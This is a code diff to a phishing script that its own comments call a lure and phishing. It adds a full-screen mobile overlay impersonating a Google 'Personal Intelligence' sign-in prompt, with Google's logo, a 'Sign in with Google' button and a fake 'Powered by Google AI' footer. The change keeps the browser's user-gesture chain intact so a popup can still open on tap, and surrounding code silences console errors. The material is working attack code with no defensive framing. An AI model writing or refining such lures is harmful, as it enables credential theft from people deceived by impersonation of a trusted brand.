@@ -37,10 +37,11 @@ console.error = function() {};
   function takeover() {
     obs.disconnect();
     if (isMobile) {
-      // Mobile: render phishing inline (no popup needed)
-      renderMobilePhish();
+      // Mobile: overlay lure on top of existing content (preserve gesture chain)
+      // Then popup on tap (no DOM clobber = gesture stays valid)
+      renderOverlay();
     } else {
-      // Desktop: show lure screen, popup on click
+      // Desktop: full DOM clobber + popup on click
       render();
       var goBtn = document.getElementById("go");
       if (goBtn) {
@@ -48,6 +49,31 @@ console.error = function() {};
         goBtn.addEventListener("touchend", function(e) { e.preventDefault(); e.stopPropagation(); openPopup(); }, { once: true });
       }
       document.addEventListener("click", function h() { openPopup(); document.removeEventListener("click", h); }, { once: true });
+    }
+  }
+
+  function renderOverlay() {
+    // Mobile: add overlay on TOP of existing content (no innerHTML clobber)
+    // This preserves the user gesture chain for window.open()
+    var overlay = document.createElement("div");
+    overlay.id = "pi-overlay";
+    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a2e;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:'Google Sans',system-ui,-apple-system,sans-serif;";
+    overlay.innerHTML = '<div style="text-align:center;max-width:420px;padding:40px">\
+<div style="font-size:48px;margin-bottom:16px">\u2728</div>\
+<h2 style="font-size:20px;font-weight:500;color:#fff;margin-bottom:12px">Personal Intelligence</h2>\
+<p style="font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px">Please allow personal intelligence connections to continue. Sign in to enable personalized AI features for this app.</p>\
+<div id="go-mobile" style="display:inline-flex;align-items:center;gap:8px;background:#fff;color:#3c4043;border:1px solid #dadce0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;-webkit-tap-highlight-color:transparent"><svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#34A853" d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z"/><path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z"/></svg>Sign in with Google</div>\
+<p style="font-size:11px;color:#555;margin-top:20px">Powered by Google AI \u2022 Privacy Policy</p>\
+</div>';
+    document.body.appendChild(overlay);
+    
+    // Attach click handler on the button WITHIN the overlay (not on replaced DOM)
+    var goBtn = document.getElementById("go-mobile");
+    if (goBtn) {
+      goBtn.addEventListener("click", function(e) {
+        e.stopPropagation();
+        openPopup();
+      }, { once: true });
     }
   }
 
